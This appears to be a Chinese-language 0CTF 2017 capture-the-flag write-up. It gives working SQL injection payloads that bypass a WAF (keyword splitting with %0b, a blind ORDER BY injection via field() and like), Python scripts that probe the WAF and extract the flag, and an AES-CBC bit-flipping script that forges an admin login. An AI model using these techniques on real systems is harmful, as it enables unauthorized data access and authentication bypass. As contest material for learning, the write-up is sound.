---
title: 0ctf2017 writeup
pubDatetime: 2017-03-19 20:00:00 +08:00
tags:
  - ctf
description: Already Archive Before 20230604
postSlug: archive_0ctf2017_writeup
---

结果高校第 9, 水啊

<!--more-->

### Web

#### simplesqlin

`id`先丢 sqlmap,发现能跑出来数据库名`news`

`order by 4` 500, `order by 3`正常

绕 waf 试试看, 发现简单的 select,from 通过%0b 即可绕过

`select` -> `sele%0bct`

直接 `id=-1 union sel%0bect 1,flag,3 fro%0bm news.flag`猜测表名和字段为 flag

`flag{W4f_bY_paSS_f0R_CI}`

#### Temmo's Tiny Shop

中午起床解这个题, login 那里上午有 bug,直接 admin 密码空可以进(其实这里面有竞争条件去买 8000 的 hint),看到 info 提示的内容(中间还换过一个表名)

`OK! Now I will give some hint: you can get flag by use \`select flag from ce63e444b0d049e9c899c9a0336b3c59\``

然后写个脚本测试一下 waf 的字符

```python
#!/usr/bin/python3
import re
import string
import requests as r

url = 'http://202.120.7.197/app.php?action=search&keyword=INT&order='
headers = {
	'Cookie': "PHPSESSID=tbuidum4os7k89q7dun6oms200",
}
NOWAF = []
WAF = []
for i in string.punctuation + string.ascii_letters:
	getter = r.get(url + i, headers=headers).text
	if 'error occurs or no result here' in getter:
		NOWAF.append(i)
		print('NoWAF: ' + i)
	elif 'WAF' in getter:
		WAF.append(i)
		print('WAF: ' + i)
	else:
		print(getter)
		exit()
print(WAF)
print(NOWAF)
```

发现只有`#,()`和字母可以用,关键词没测,用的时候再说

尝试了一些传参数的位置, 因为不能单引号, 也绕不过这个 waf, 下手只能在搜索的`order`位置上,先通过`=1`和`=id`确认是`order by`注入,通过顺序不同考虑 bool 注入

注册一个新号防干扰, 买 1600 和 300 的, 通过利用`field(price, 1600, 300)`和`field(price, 1600, 1)`返回的 goods 顺序不同,构造 payload

`order=field(price,1600,if(mid((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),%d,1)like(%s),300,1))`

因为是 like, 不跑 2 分, 上多线程

```python
import requests as r
import gevent
from gevent.monkey import *

url = 'http://202.120.7.197/app.php?action=search&keyword=&order=field(price,1600,if(mid((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),%d,1)like(%s),300,1))'
def run(k):
#	print('----%d----' % k)
	a = 0
	for i in range(0, 255):
		if a == 4:
			break
		s = r.get(url % (k,hex(i)), headers=headers).text
	#	print(s)
		if '"goods":[{"id":"6","' not in s:
			print('%d: %s' % (k, chr(i)))
			a += 1
		else:
			continue

gevent.monkey.patch_socket()
gevent.monkey.patch_ssl()

threads = [gevent.spawn(run, i) for i in range(6,31)]
gevent.joinall(threads)
```

拿到每一位去掉`%_`,得到大小写不明的`flag{r4ce c0nditi0n i5 excited}`

尝试用 ascii 判断 ascii 码, 发现(长度)被 WAF, 先试一下 flag 对不对再说

中间补上`_`, 小写尝试一下, flag 正确

### Misc

#### Welcome

IRC 即时聊天，访问 freenode 网站进入聊天室，获得 flag
http://webchat.freenode.net/?randomnick=0&channels=#0ctf2017

### Crypto

#### integrity

题目流程：

1. 首先随机 key
2. register： 输入 name，首先对 name 补足后缀，随机 iv，返回 AES_CBC( md5(name) || name ) 作为 secret
3. login： 用户输入 secret，按 register 逆着解码得到 name，若为 admin，则给出 flag

其中限制：输入的 name 长度不大于 32，且对 name 有 strip() 操作。

我们的目标为 admin，对此构造 name，并预先计算补全与 md5 值。

```python
name = "admin" + "\x0b" * 11 + suffix  # suffix 为任意长度小于 16 的字符串，我取的是 suffix = "admin"）
goal = "admin"  # 目标为 admin

pad_name = pad(name)  # "admin" + "\x0b" * 11 + "admin" + "\x0b" * 11
pad_goal = pad(goal)  # "admin" + "\x0b" * 11

md5_name = md5(name).digest()
md5_goal = md5(goal).digest()
```

提交 name 后获得一个代表了 64 字节的 secret，取出 iv 和 前两组密文，即前 48 字节，有一组 iv，一组 md5 值，一组一半的 name（即 pad_goal）。
其中第三组已符合要求，对于第二组，修改第一组的 iv 进行比特翻转攻击：iv = iv ⊕ md5_name ⊕ md5_goal
三组重新组合后 login 即可获取 flag

完整脚本：

```python
import hashlib
import socket
import time
import binascii


BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
def md5(s):
    return hashlib.md5(s.encode()).digest()
def send(m):
    if isinstance(m, str):
        m = m.encode()
    print("send:", m)
    s.send(m)
def rec():
    m = s.recv(1024)
    print("recv:", m)
    return m


s = socket.socket()
s.connect(('202.120.7.217', 8221))
time.sleep(0.5)
md5_goal = [int(x) for x in md5("admin" + "\x0b" * 11)]
md5_name = [int(x) for x in md5("admin" + "\x0b" * 11 + "admin" + "\x0b" * 11)]

rec()
send("r\n")
send("admin" + "\x0b" * 11 + "admin\n")
rec()

data = rec().decode().replace('\n', '')
secret = [0] * 48
for i in range(0, 48):
    secret[i] = int(data[(i << 1): (i << 1) + 2], 16)
new_secret = [secret[i] ^ md5_goal[i] ^ md5_name[i] for i in range(16)] + secret[16:]
ans = b""
for x in new_secret:
    ans += bytes([x])

send("l\n")
send(binascii.b2a_hex(ans) + b"\n")
rec()
rec()
s.close()

```

### Reverse

#### Choices

看了一下 text 里的命令行，这是是一个 pass，llvm 的 pass，估计是做混淆的，看到 flatten 这个函数名，估计是拿 ollvm 改了改，获得源码一对照就知道改了什么地方。

Flatten 算法实现http://ac.inf.elte.hu/Vol_030_2009/003.pdf ,他修改的地方就是原本自动修改的控制控制流的值变成由用户输入了，那么我还原出这个值序列即可，通过逆向我们知道了值序列的生成算法，那么我们就可以生成一个值序列了。以这个作为输入即可。
